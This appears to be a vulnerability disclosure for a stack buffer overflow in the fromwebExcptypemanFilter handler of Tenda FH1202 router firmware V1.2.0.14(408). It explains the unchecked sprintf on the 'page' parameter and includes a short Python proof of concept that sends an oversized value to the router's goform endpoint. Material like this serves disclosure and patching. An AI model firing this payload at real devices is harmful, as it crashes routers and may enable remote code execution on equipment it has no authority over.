# Tenda FH1202 fromwebExcptypemanFilter
### Overview
vendor: Tenda

product: FH1202

version: V1.2.0.14(408)

type: Stack Overflow
### Vulnerability Description
Tenda FH1202 V1.2.0.14(408) were discovered to contain a stack overflow via the page parameter in the fromwebExcptypemanFilter function.
### Vulnerability details
In function fromwebExcptypemanFilter line 18, it reads in a user-provided parameter `page`, and the variable is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `s`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/5.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/webExcptypemanFilter"

data = {
    "page": "a" * 1000
}

response = requests.post(url, data=data)
print(response.text)
```

![](images/7.png)
